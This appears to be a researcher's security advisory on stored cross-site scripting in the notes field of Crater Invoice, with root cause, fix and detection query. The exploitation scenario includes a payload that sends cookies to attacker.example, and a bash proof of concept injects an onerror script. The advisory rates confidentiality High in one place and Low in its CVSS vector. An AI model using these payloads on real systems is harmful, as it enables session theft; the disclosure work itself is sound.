# Security Advisory: Stored Cross-Site Scripting (XSS) in Invoice Notes

> **Identifier:** Pending CVE assignment (Internal: F-004)
> **Publication Date:** 29/10/2026
> **Last Updated:** 29/10/2026
> **Severity:** Medium
> **CVSS:** 5.4 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
> **CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
> **Status:** Unpatched

---

## 1. Executive Summary

Crater Invoice (≤ 6.0.6) fails to encode HTML entities in the `notes` field of invoices before rendering them in the PDF preview endpoint. An authenticated user with permission to create invoices can inject arbitrary HTML and JavaScript into the note field; the payload is reflected unencoded in `GET /invoices/pdf/{unique_hash}?preview=1`, enabling stored XSS against any user or tenant that views the preview. No official fix is available as of this date.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| Crater Invoice | ≤ 6.0.6 | None | Affected |
| Component: Invoice PDF preview | tag 6.0.6 / commit 05d5ce26 | None | Affected |

- **Repository / Ecosystem:** https://github.com/crater-invoice-inc/crater
- **Evaluated stack:** PHP 8.1, Laravel 8.x, Apache 2.4, MariaDB 10.6, Debian (Docker)

### Unaffected Products

- Versions > 6.0.6 not evaluated.

---

## 3. Vulnerability Description

The invoice creation endpoint (`POST /api/v1/invoices`) accepts a free-text `notes` field. The value is stored as-is in the `invoices` table. When the PDF preview is rendered via the Blade template `resources/views/app/pdf/invoice/invoice1.blade.php`, the notes field is output using `{!! !!}` (unescaped), instead of the safe `{{ }}` (escaped) syntax. Any HTML or JavaScript injected in the notes field is returned verbatim in the HTTP response of the preview endpoint.

**Root cause:**

```blade
{{-- resources/views/app/pdf/invoice/invoice1.blade.php --}}
{!! $invoice->notes !!}
```

The `{!! !!}` directive outputs raw, unescaped HTML. Using `{{ }}` would apply `htmlspecialchars()` automatically.

### Necessary Conditions

- **Authentication:** User (must have `create-invoice` ability in the active company)
- **User interaction:** Required — a victim must open the preview URL
- **Attack vector:** Network
- **Preconditions:** Attacker has an account with invoice creation rights in a Crater company

---

## 4. Impact

An attacker can store arbitrary JavaScript that executes in the browser of any user who views the invoice preview link.

- **Confidentiality — High:** session tokens, Sanctum cookies, or other sensitive data visible to the victim can be exfiltrated
- **Integrity — Low:** the attacker can modify DOM content presented to the victim
- **Availability — None:** no service disruption

---

## 5. Classification

### CVSS

- **Score:** 5.4
- **Severity:** Medium
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | Low |
| User Interaction (UI) | Required |
| Scope (S) | Changed |
| Confidentiality (C) | Low |
| Integrity (I) | Low |
| Availability (A) | None |

### CWE

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

### CAPEC

- CAPEC-86: XSS Through HTTP Query Strings

---

## 6. Exploitation Scenario

1. Attacker authenticates as a user with `create-invoice` ability in any Crater company.
2. Attacker creates an invoice with `notes` set to `<img src=x onerror="fetch('https://attacker.example/c?'+document.cookie)">`.
3. Crater stores the payload unencoded in the database.
4. Attacker shares or causes the victim to open `GET /invoices/pdf/{unique_hash}?preview=1`.
5. The browser executes the injected script; cookies or tokens are sent to the attacker's endpoint.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): resources/views/app/pdf/invoice/invoice1.blade.php
         resources/views/app/pdf/invoice/invoice2.blade.php
         resources/views/app/pdf/invoice/invoice3.blade.php
Parameter(s): notes (POST body, stored in invoices.notes)
Method: GET /invoices/pdf/{unique_hash}?preview=1 · Authentication: pdf-auth middleware
```

### Example Request — Create Invoice with Payload

```http
POST /api/v1/invoices HTTP/1.1
Host: 127.0.0.1:18080
Authorization: Bearer <sanctum_token>
Content-Type: application/json
company: 1

{
  "invoice_date": "2026-10-29",
  "due_date": "2026-11-29",
  "invoice_number": "INV-XSS-001",
  "status": "DRAFT",
  "paid_status": "UNPAID",
  "sub_total": 0,
  "total": 0,
  "due_amount": 0,
  "discount_type": "fixed",
  "discount": "0",
  "discount_val": 0,
  "tax": 0,
  "notes": "<img src=x onerror=alert('XSS_CONFIRMED')>VULN_MARKER",
  "items": []
}
```

### Example Request — Trigger Preview

```http
GET /invoices/pdf/{unique_hash}?preview=1 HTTP/1.1
Host: 127.0.0.1:18080
Accept: text/html
```

### Observed Response

```text
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

...
<img src=x onerror=alert('XSS_CONFIRMED')>VULN_MARKER
...
```

The payload `VULN_MARKER` and the unencoded `<img>` tag are present in the response body without encoding.

### Result

Reproduced in authorized lab (`http://127.0.0.1:18080`), tag 6.0.6 / commit `05d5ce26`. The payload was returned unencoded in HTTP 200 response. JavaScript execution was not validated dynamically (no browser was driven in this test). Test was non-destructive; the synthetic invoice was removed after testing.

**Evidence:** `poc/evidence/F-004-F-010-live/README.md`

---

## 8. Proof of Concept

The PoC below is for authorized environments only and demonstrates the presence of unencoded output, not weaponized exploitation.

```bash
#!/bin/bash
# Target: Crater Invoice <= 6.0.6
# Vulnerability: Stored XSS in Invoice Notes (CWE-79)
# Test environment: localhost only
# Date: 2026-10-29
# Impact: Unencoded HTML payload returned in preview response

BASE="http://127.0.0.1:18080"
MARKER="VULN_XSS_MARKER_$(date +%s)"

# Step 1: authenticate
TOKEN=$(curl -s -X POST "$BASE/api/v1/auth/login" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{"username":"admin@craterapp.com","password":"crater@123","device_name":"xss-poc"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))")

echo "[*] Token: ${TOKEN:0:20}..."

# Step 2: create invoice with XSS payload in notes
RESP=$(curl -s -X POST "$BASE/api/v1/invoices" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -H "company: 1" \
  -d "{
    \"invoice_date\": \"2026-10-29\",
    \"due_date\": \"2026-11-29\",
    \"invoice_number\": \"INV-XSS-POC\",
    \"status\": \"DRAFT\",
    \"paid_status\": \"UNPAID\",
    \"sub_total\": 0,
    \"total\": 0,
    \"due_amount\": 0,
    \"discount_type\": \"fixed\",
    \"discount\": \"0\",
    \"discount_val\": 0,
    \"tax\": 0,
    \"notes\": \"<img src=x onerror=alert('XSS')>$MARKER\",
    \"items\": []
  }")

HASH=$(echo "$RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('unique_hash',''))" 2>/dev/null)
INV_ID=$(echo "$RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('id',''))" 2>/dev/null)

echo "[*] Invoice id=$INV_ID hash=$HASH"

# Step 3: request preview and check for unencoded payload
PREVIEW=$(curl -s "$BASE/invoices/pdf/$HASH?preview=1" \
  -H "Accept: text/html" \
  -H "Authorization: Bearer $TOKEN")

if echo "$PREVIEW" | grep -q "$MARKER"; then
  echo "[VULNERABLE] Marker found unencoded in preview response"
  echo "$PREVIEW" | grep -o ".\{0,30\}$MARKER.\{0,30\}"
else
  echo "[NOT VULNERABLE or marker not found]"
fi

# Step 4: cleanup — delete the test invoice
curl -s -X DELETE "$BASE/api/v1/invoices/$INV_ID" \
  -H "Accept: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -H "company: 1" > /dev/null

echo "[*] Invoice $INV_ID removed."
```

### Expected Result

```text
[VULNERABLE] Marker found unencoded in preview response
<img src=x onerror=alert('XSS')>VULN_XSS_MARKER_...
```

### PoC Limitations

- Does not cause service disruption.
- Does not exfiltrate real credentials or third-party data.
- Synthetic invoice is deleted after the test.
- Does not automate mass exploitation.

---

## 9. Reproduction Steps

1. Start an authorized local instance of Crater ≤ 6.0.6.
2. Authenticate as a user with `create-invoice` ability.
3. Create an invoice with `notes` containing `<img src=x onerror=alert(1)>MARKER`.
4. Access `GET /invoices/pdf/{unique_hash}?preview=1`.
5. Observe that `MARKER` and the `<img>` tag are present unencoded in the HTML response.
6. Compare with expected safe behavior: `{{ $invoice->notes }}` would render `&lt;img ...&gt;MARKER`.

---

## 10. Mitigation

Until an official fix is available:

- Replace `{!! $invoice->notes !!}` with `{{ $invoice->notes }}` in all PDF Blade templates.
- Add a server-side sanitizer (e.g., `strip_tags()` or HTMLPurifier) to the `notes` field before storage.
- Apply a Content Security Policy (`Content-Security-Policy: default-src 'self'`) on preview responses.
- Restrict invoice preview access to authenticated users of the same company.

> Mitigations reduce risk but may not completely eliminate the vulnerability.

---

## 11. Fix

**No official fix as of 2026-10-29.**

### Recommended Change to Vendor

Replace in all invoice/estimate PDF Blade templates:

```blade
{{-- VULNERABLE --}}
{!! $invoice->notes !!}

{{-- FIXED --}}
{{ $invoice->notes }}
```

Files affected:
- `resources/views/app/pdf/invoice/invoice1.blade.php`
- `resources/views/app/pdf/invoice/invoice2.blade.php`
- `resources/views/app/pdf/invoice/invoice3.blade.php`
- `resources/views/app/pdf/estimate/estimate1.blade.php`
- `resources/views/app/pdf/estimate/estimate2.blade.php`
- `resources/views/app/pdf/estimate/estimate3.blade.php`

---

## 12. Detection and Indicators

Possible exploitation indicators:

- Invoice `notes` field in the database containing `<script>`, `onerror=`, `javascript:`, or similar HTML event handlers.
- Unusual outbound requests from users' browsers after viewing invoice previews.

### Example Log Search

```text
# Search invoices table for suspicious notes
SELECT id, unique_hash, notes FROM invoices
WHERE notes REGEXP '<[^>]+(on[a-z]+=|javascript:)';
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 27/10/2026 | Vulnerability identified (static analysis + dynamic testing) |
| 29/10/2026 | Confirmed in authorized environment (tag 6.0.6) |
| 29/10/2026 | Advisory prepared |
| pending | Vendor notified |
| pending | CVE requested or reserved |
| pending | Fix made available |
| pending | Advisory published |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** crater-invoice-inc
- **Channel used:** Private GitHub Security Advisory (pending)
- **Date of first notification:** pending
- **Response status:** Awaiting response

---

## 15. Credits

- **Researcher:** vinniboy021
- **Organization:** Independent
- **Contact:** vinniboy021@gmail.com

---

## 16. References

- [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
- [CVSS 3.1 Calculator](https://www.first.org/cvss/calculator/3.1)
- [Product repository](https://github.com/vinniboy021-blip/crater)
- [Laravel Blade XSS — Raw Output](https://laravel.com/docs/8.x/blade#displaying-unescaped-data)

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 29/10/2026 | Initial draft |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes. The information was obtained in an authorized environment and disclosed responsibly. The author does not encourage unauthorized access, service disruption, privacy violations, or any illegal activity.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021-blip
